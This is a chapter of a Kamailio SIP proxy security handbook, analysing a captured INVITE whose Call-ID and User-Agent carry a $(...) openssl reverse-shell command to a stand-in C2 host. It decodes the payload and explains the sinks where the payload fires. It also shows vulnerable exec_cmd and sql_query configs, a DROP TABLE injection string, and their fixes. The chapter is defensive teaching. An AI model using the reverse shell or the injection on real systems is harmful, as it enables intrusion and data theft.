# 9.4 Fuzzing, and a command-injection → reverse-shell case study

> [!IMPORTANT]
> Built on a real captured attack: an `INVITE` with `$(...)` shell constructs in its `User-Agent` and `Call-ID`, aiming to open a reverse shell. The handbook's question isn't what the payload does — it's **is *Kamailio* the vulnerable component?** Almost never: a vanilla proxy forwards those bytes and never executes them. But there are a couple of places where Kamailio *is* the vuln — a config that shells out, or one that builds SQL from request data — and several more downstream where its data lights the fuse. This chapter shows precisely where.

## Fuzzing the parser

The parser is the first target: hand-written C walking raw network bytes ([3.2 the parsed message](08-parsed-message.md)), registering header name/value spans on the first pass and parsing values lazily — fast, but a wide surface of pointer arithmetic over attacker input. The bug class is the byte-span classic: an over-read or off-by-one on a truncated, oversized, or pathologically nested header that walks past the receive buffer, or a length field disagreeing with the bytes behind it.

The kit is mature: `SIPp` replays malformed scenarios from hand-written XML; the **PROTOS SIP suite** (Oulu University's OUSPG) is the canonical malformed-`INVITE` corpus that shook out parser bugs industry-wide; coverage-guided fuzzers (**AFL**/AFL++) mutate against the parser entry points. (No CVE cited on purpose — the *class* is the point, not a patched instance.) `sanity` ([9.2](37-security-modules.md)) is triage, not armour: it runs *after* the first-pass parse and checks form, not the memory-safety bug fuzzing hunts. The real defence against the crash class is a patched, current Kamailio.

## The captured payload

The interesting payload isn't malformed at all — a clean `INVITE` that parses and passes `sanity`, carrying its weapon in plain header text:

```
INVITE sip:00XXXXXXXXXX@sip.example.net SIP/2.0
Via: SIP/2.0/UDP 198.51.100.7:5060;branch=z9hG4bK-524287-1
From: "00XXXXXXXXXX" <sip:00XXXXXXXXXX@example.com>;tag=8472
To: <sip:00XXXXXXXXXX@sip.example.net>
Call-ID: $(mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 203.0.113.10:443 > /tmp/s; rm /tmp/s)@198.51.100.7
CSeq: 1 INVITE
Contact: <sip:00XXXXXXXXXX@198.51.100.7:5060>
User-Agent: $(mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 203.0.113.10:443 > /tmp/s; rm /tmp/s)
Max-Forwards: 70
Content-Type: application/sdp
Content-Length: 0
```

Decode the substituted command — every token earns its place:

- `mkfifo /tmp/s` — a named pipe (FIFO) on disk.
- `/bin/sh -i < /tmp/s 2>&1` — an interactive shell reading commands *from* the FIFO, stderr folded into stdout.
- `| openssl s_client -quiet -connect 203.0.113.10:443` — pipes the shell's output into a TLS client to the attacker's C2 at `203.0.113.10:443`; over `:443` with `openssl s_client` it looks like ordinary outbound HTTPS and slides past naive egress filtering.
- `> /tmp/s` — feeds the TLS client's received bytes back into the FIFO, so attacker keystrokes reach the shell's stdin, closing the loop.
- `rm /tmp/s` — removes the pipe to clean up.

The rest is decoration so the packet reads as a mundane call. The *same* `$(...)` sits in both `Call-ID` and `User-Agent`: not knowing your config, the attacker sprays the substitution across fields, betting *some* downstream consumer reads one into a shell.

## Why a vanilla proxy is not vulnerable

Run it through a plain relay and **nothing executes.** The parser does what [3.2](08-parsed-message.md) describes — records the header's name and a `(pointer, length)` byte span into the receive buffer. `$(mkfifo …)` is stored as *bytes*, a `str` into `msg->buf`; the core never interprets, expands, or evaluates it. There is no shell in the parse path, the routing engine, or forwarding. On forward, the value rides along through the lump system ([3.3 lumps](09-lumps.md)) — the buffer is never edited in place, untouched headers are copied verbatim — so `User-Agent: $(mkfifo …)` leaves exactly as it arrived, never handed to `/bin/sh`. A proxy that routes, authenticates, and relays has no code path that turns a header value into a process. The payload is inert. That is the default and the common case.

## When it DOES fire

The payload becomes a reverse shell only when something on your side feeds the header value into a shell. Three sinks, in order of how directly Kamailio is implicated:

**1. The `exec` module — the one in-core footgun.** [`exec`](https://kamailio.org/docs/modules/devel/modules/exec.html) shells out by design: `exec_cmd()`/`exec_msg()`/`exec_avp()`/`exec_dset()` run their command string through `popen()`, and that string **may contain pseudo-variables**, interpolated before execution. Interpolate an attacker-controlled field and you've built a remote shell:

```
# VULNERABLE — $ua is the raw User-Agent; $(...) is interpolated and run by the shell
exec_cmd("echo $ua >> /var/log/agents.log");
```

`$ua` expands to `$(mkfifo …)`, the shell runs *its own* command substitution, the reverse shell opens. The module docs say it plainly: variables with malicious input "may result in OS command injection … input validation is required." The safe form validates then single-quotes:

```
# SAFER — strict allowlist first, then single-quote as one literal arg
if ($ua =~ "^[A-Za-z0-9 ._/-]+$") {
    exec_cmd("echo '$ua' >> /var/log/agents.log");
}
```

Better still, don't shell out with message data — quoting alone is fragile.

**2. Shell-based capture or logging pipelines.** Kamailio isn't running the command, but its data flows into one that is: a sidecar slurps fields (syslog, an `evapi`/`xhttp` hook, an sngrep-style capture export) and does `sh -c "lookup-ua.sh $UA"`. The shell is in the script; the taint came from the `User-Agent` Kamailio forwarded.

**3. External CDR / analytics scripts.** One hop further: a billing or analytics job reads `From`/`User-Agent`/`Call-ID` out of CDRs and assembles a shell command (a `system()`, a backtick in a Perl/Python wrapper). The attacker's `Call-ID` `$(...)` landed in the CDR verbatim and detonates whenever something builds a shell string from it.

## The same taint, a SQL sink

Swap the interpreter and the bug survives. Kamailio is usually DB-backed — `auth_db`, `usrloc`, `dialplan`, `permissions`, `lcr` — and several modules build SQL from SIP-derived values. The *parameterized* paths are safe: configure `auth_db` with column names and the DBAPI escapes each value through the driver before it reaches the server. The exposed path is *string-building* — `sqlops`' `sql_query()` and `avpops`' `avp_db_query()` — where you compose the query text yourself and pseudo-variables are interpolated verbatim:

```
# VULNERABLE — $fU is the From-URI user, taken straight from the request
sql_query("ca", "SELECT plan FROM subscriber WHERE username='$fU'", "ra");
```

`$fU` is attacker-controlled — URI text the parser stored as bytes, exactly like the `User-Agent` above — and `sanity` passed it because it is legal SIP. A `From` user of `x';DROP TABLE subscriber;--` closes the quote and appends a statement; the same path exfiltrates the `subscriber` table's `ha1` password hashes by union/boolean. The fix mirrors the `exec` rule — escape at the boundary with the SQL transformation `{s.escape.common}`:

```
# SAFE — {s.escape.common} escapes quotes/specials for SQL
sql_query("ca", "SELECT plan FROM subscriber WHERE username='$(fU{s.escape.common})'", "ra");
```

`secf_check_sqli_all()` ([9.2](37-security-modules.md)) only swats the obvious probes; the real defence is escaping every interpolated value at the query, or staying on the parameterized module API that escapes for you.

The unifying lesson ties to [9.2](37-security-modules.md): **the taint reads as trusted because it survived parsing and `sanity`** — but `sanity` validated only *SIP syntax*, and `$(...)` and `'` are legal SIP token content. Well-formed SIP says nothing about what a *shell* or a *database* will do with the bytes. Every sink makes the same wrong assumption: that surviving the SIP layer means the bytes are safe to hand to a different interpreter.

## How to avoid it

**Never pass a SIP-derived string to another interpreter.**

- **Don't shell out with message data.** To log or count, use Kamailio's own logging/accounting, not `exec`. The cheapest fix is no shell in the path.
- **If `exec` is unavoidable, kill the interpolation, don't just escape it.** Prefer an argument-vector helper — the value passed as a positional argument the OS hands across without a shell — over building a `sh -c "…$pv…"` string. If you must interpolate, single-quote *and* validate against a strict allowlist; a bad-character blocklist loses to an encoding you missed.
- **Escape SQL built from SIP values.** With `sqlops`/`avpops`, wrap every interpolated pseudo-variable in `{s.escape.common}`, or stay on the parameterized module API (e.g. `auth_db` column config) that escapes through the driver — never drop `$fU`/`$tU` into a query string raw.
- **Filter content with `secfilter`.** `secf_check_ua()` and `secf_check_sqli_all()` ([9.2](37-security-modules.md)) reject obvious metacharacters before any sink — raising the cost of the naive payload, not substituting for fixing the sink.
- **Don't expect `sanity` to help.** It validates form; this attack is well-formed. Counting on it here is the exact mistake the chapter is about.
- **Defence in depth at the edge.** These ride in on quiet scanners already in the reputation feeds: `pike` + the `ipban` `htable` + apiban ([9.3](38-security-blocklists.md)) keep most from reaching your route, `topoh` ([8.1 topology hiding](19-topos.md)) starves the recon, and `fail2ban` catches the source after the first probe. None fixes the sink — together they keep most of this traffic from getting to test it.

## The two paths

The same `User-Agent` header takes one of two routes, decided entirely by what you wired downstream:

```mermaid
flowchart TB
    H["INVITE User-Agent: $(mkfifo …; openssl s_client -connect C2 …)"] --> P[Parser stores value<br/>as raw byte span into msg->buf<br/>3.2 parsed message]

    P --> SAFE{Does anything<br/>feed it to a shell?}

    SAFE -->|No — vanilla proxy| FWD[Forward verbatim via lumps<br/>3.3 lumps<br/>bytes never executed]
    FWD --> INERT[Payload inert]

    SAFE -->|Yes — exec PV / external shell pipeline| SINK[exec_cmd '...$ua...'<br/>or sh -c in capture/CDR script]
    SINK --> SUB[Shell performs command substitution<br/>on $(...)]
    SUB --> RS[TLS reverse shell to<br/>203.0.113.10:443]

    classDef bad fill:#b62324,stroke:#b62324,color:#fff
    classDef good fill:#1f6feb,stroke:#1f6feb,color:#fff
    classDef pipe fill:#6e7681,stroke:#6e7681,color:#fff
    classDef warn fill:#bf8700,stroke:#bf8700,color:#fff
    class H bad
    class P,SAFE pipe
    class FWD,INERT good
    class SINK,SUB warn
    class RS bad
```

The fork is the whole chapter: identical bytes, identical parse, identical `sanity` verdict — the only thing deciding "inert string" versus "reverse shell" is whether *you* put another interpreter on the path.

Which is the note Part 9 closes on. Kamailio's security posture is overwhelmingly about **what you wire around it** — the cheap edge filters of [9.2](37-security-modules.md), the reputation and ban state of [9.3](38-security-blocklists.md), the auth boundary that turns an anonymous datagram into a known identity. The core treats hostile bytes as data and forwards them as data. The genuine in-core footguns are narrow and avoidable: `exec` with an unescaped pseudo-variable, and a raw `sql_query`/`avp_db_query` that interpolates one — keep SIP-derived strings away from shells and out of hand-built query strings, and the captured payload stays the inert text the parser always thought it was.

---

<p markdown="1" align="center">
  [← Table of contents](../) · [← 9.3 Dynamic blocklists](38-security-blocklists.md) · [Next: 10.1 What IMS is →](31-ims-overview.md)
</p>
